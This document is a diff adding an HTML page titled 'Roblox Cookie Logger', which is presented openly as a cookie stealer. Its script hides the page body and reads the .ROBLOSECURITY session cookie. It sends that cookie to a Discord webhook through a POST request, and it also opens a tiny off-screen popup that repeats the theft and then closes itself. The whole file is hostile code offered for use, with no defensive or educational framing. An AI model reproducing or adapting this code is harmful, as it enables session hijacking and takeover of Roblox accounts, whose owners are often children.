@@ -1,1 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Cookie Logger</title>
+    <style>
+        body {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
 
+        function logCookie() {
+            // Find the .ROBLOSECURITY cookie
+            const cookies = document.cookie.split(';');
+            let robloxSecurityCookie = '';
+
+            cookies.forEach(cookie => {
+                if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
+                    robloxSecurityCookie = cookie.trim();
+                }
+            });
+
+            if (robloxSecurityCookie) {
+                const data = {
+                    content: `Logged .ROBLOSECURITY Cookie: \`${robloxSecurityCookie}\``
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                }).then(response => {
+                    if (response.ok) {
+                        console.log('.ROBLOSECURITY cookie logged successfully');
+                    } else {
+                        console.error('Failed to log .ROBLOSECURITY cookie');
+                    }
+                }).catch(error => {
+                    console.error('Error logging .ROBLOSECURITY cookie:', error);
+                });
+            } else {
+                console.error('.ROBLOSECURITY cookie not found');
+            }
+            window.close();
+        }
+
+        function openLoggerWindow() {
+            const loggerWindow = window.open('', '_blank', 'width=1,height=1,left=-100,top=-100');
+            if (loggerWindow) {
+                loggerWindow.document.write(`
+                    <!DOCTYPE html>
+                    <html lang="en">
+                    <head>
+                        <meta charset="UTF-8">
+                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                        <title>Logging...</title>
+                    </head>
+                    <body onload="logCookie()">
+                        <script>
+                            function logCookie() {
+                                // Find the .ROBLOSECURITY cookie
+                                const cookies = document.cookie.split(';');
+                                let robloxSecurityCookie = '';
+
+                                cookies.forEach(cookie => {
+                                    if (cookie.trim().startsWith('.ROBLOSECURITY=')) {
+                                        robloxSecurityCookie = cookie.trim();
+                                    }
+                                });
+
+                                if (robloxSecurityCookie) {
+                                    const data = {
+                                        content: \`Logged .ROBLOSECURITY Cookie: \$\{robloxSecurityCookie\}\`
+                                    };
+
+                                    fetch('${webhookUrl}', {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json'
+                                        },
+                                        body: JSON.stringify(data)
+                                    }).then(response => {
+                                        if (response.ok) {
+                                            console.log('.ROBLOSECURITY cookie logged successfully');
+                                        } else {
+                                            console.error('Failed to log .ROBLOSECURITY cookie');
+                                        }
+                                    }).catch(error => {
+                                        console.error('Error logging .ROBLOSECURITY cookie:', error);
+                                    });
+                                } else {
+                                    console.error('.ROBLOSECURITY cookie not found');
+                                }
+                                window.close();
+                            }
+                            logCookie();
+                        </script>
+                    </body>
+                    </html>
+                `);
+            } else {
+                alert('Popup blocked. Please allow popups for this site.');
+            }
+        }
+
+        openLoggerWindow();
+    </script>
+</body>
+</html>
